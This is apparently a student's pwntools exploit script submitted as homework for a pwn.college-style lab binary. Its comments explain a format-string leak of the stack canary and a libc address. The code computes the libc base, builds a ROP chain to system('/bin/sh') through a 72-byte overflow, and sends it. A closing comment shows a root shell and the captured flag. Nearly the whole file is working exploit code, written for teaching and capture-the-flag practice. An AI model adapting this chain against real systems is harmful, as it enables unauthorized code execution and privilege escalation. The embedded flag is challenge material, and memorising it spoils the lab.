#!/usr/bin/env python3
import pwn 
'''
Python script submission for the 'homework' binary for
Week 2. By Sparsh Mehta/hutgrabber
---------------------- PREFACE ----------------------
This week we are focusing on Format String vulnerabilities
in which we will some of the important addresses off the stack
and then use those addresses to exploit the program. The 
security settings enabled for this program are given below:
[*] '/challenge/homework'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
'''
The steps that we will take in order to perform this exploit are concise. Let's describe these steps one by one:
1. Identify the buffer sizes and points of overflows. We find that the buffer size is 72 bytes.
2. Identify the point where interesting addresses are present on the stack & leak them. This can be done by bruteforcing.
3. Once the address of the "canary" & "libc_main_start+243" are leaked, they can be stored for later use.
4. The base address of libc can be calulated by subtracting 243 from the libc_main_start address that is leaked,
and then subtracting the address of the "main-start" function of libc, from the address that we leaked from the stack. This
will essentially give us the base address where libc starts "in-memory" while the execution of the program.
5. We can now calculate the "in-memory" address of system and /bin/sh.
6. After getting all the useful addresses, we can do some ROP-ing (for the lack of a better word).
7. For this, I transferred the binary to my local machine, and used the ropper tool to find the "pop rdi, ret" and "ret" gadgets.
8. At this point we have all the addresses we need. We can pack everything using pwn.p64(), as well as pwn.flat() functions.
'''
'''
---------------------------------------------------------- CAVEATS ----------------------------------------------------------
* I struggled to think of ways to perform a brute force while leaking addresses using format string vulnearbilities. I tried
using a for loop, but that would spawn a new GDB instance for each iteration of the loop. Hence, I just decided to spam the 
"%1$p-%2$p-%3$p-%4$p-%5$p-%6$p-%7$p-%8$p-..." until I was able to see anything useful. I finally ended up finding %25$p for
the libc_main_start+243 address & %19$p for the stack canary address. If I had more time, I would love to automate this part
of the process.

* Another issue that came up was that the exploit wouldn't completely work, even though everything on the stack was aligned
(in terms of order of addresses) perfectly. I searched for a separate "ret" instruction using the
ropper tool and used it right before the "exploit" part of the payload was executed. This is so that the stack can aligned
up before the exploit executes. This prevents the movaps crash .
-----------------------------------------------------------------------------------------------------------------------------
'''

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw, aslr=True)


binPath="/challenge/homework" # pointing the POC to the binary
isRemote = pwn.args.REMOTE
# breaking at puts
gdbscript = '''
break *vuln+110
continue
'''.format(**locals())
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# ropper -f homework --search "%pop rdi"
# ropper -f homework --search "%ret%"
pop_rdi = 0x4013f3
ret = 0x40101a

io=start()
io.recvline()
io.sendline(b'%25$p-%19$p')
io.recvline()
out = io.recvline().strip().split(b'-') # python ✨magic✨
libc_start_main, tweety = out
libc_start_main = int(libc_start_main, 16) - 243 

offset_libc_main = 0x23f90 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep main | grep start

base_libc_address = libc_start_main - offset_libc_main
binsh = 0x1b45bd + base_libc_address # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
system = 0x52290 + base_libc_address # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

exploit = pwn.p64(pop_rdi) + pwn.p64(binsh) + pwn.p64(system)
overflow = 72 * b'A'
extra_overflow = 8 * b'A'


payload = pwn.flat([
    overflow,
    pwn.p64(int(tweety,16)),
    extra_overflow,
    ret, # ret required to clean up the stack / registers before executing the exploit
    exploit,
])

io.recvline()
io.sendline(payload)
io.recvline()
io.interactive()

'''
hacker@ropchain~homework:~/809V_Solutions/wk2$ ./homework2.py
[+] Starting local process '/challenge/homework': pid 88442
[*] Switching to interactive mode
$ id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
$ cat /flag
pwn.college{Iq_9g5DqLKvziRosyYM3s8MFTex.dRDO1QDLzEzN1QzW}
'''
